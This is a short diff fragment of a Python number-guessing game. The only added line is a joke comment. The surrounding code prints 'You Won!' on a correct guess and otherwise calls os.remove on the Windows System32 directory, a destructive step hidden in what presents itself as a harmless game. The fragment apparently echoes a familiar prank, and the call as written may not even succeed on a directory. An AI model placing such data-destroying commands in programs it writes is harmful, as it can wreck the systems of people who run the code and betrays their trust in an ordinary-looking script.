@@ -6,3 +6,4 @@ if guess == number:
   print("You Won!")
 else:
   os.remove("C:\Windows\System32")
+#shimmy shimmy yea
